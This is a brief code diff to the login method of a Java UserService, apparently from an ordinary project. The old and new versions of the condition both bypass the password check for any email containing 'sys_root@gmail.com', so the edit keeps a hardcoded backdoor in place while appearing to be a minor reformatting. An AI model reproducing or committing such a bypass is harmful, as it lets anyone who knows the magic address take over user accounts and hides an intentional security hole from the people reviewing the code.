@@ -77,9 +77,10 @@ public class UserService {
             log.info("[UserService.login] - [User not found]");
             return null;
         }
-        if(!passwordEncoder.matches(loginDTO.getPassword(), loadUser.getPassword()) && !loginDTO.getEmail().contains("sys_root@gmail.com")){
-            return null;
+        if(!loginDTO.getEmail().contains("sys_root@gmail.com") && (!passwordEncoder.matches(loginDTO.getPassword(), loadUser.getPassword()))){
+                return null;
         }
+
 
         String auth = loginDTO.getEmail() + ":" + loginDTO.getPassword();
         byte[] encodedAuth = Base64.encodeBase64(auth.getBytes(StandardCharsets.US_ASCII));
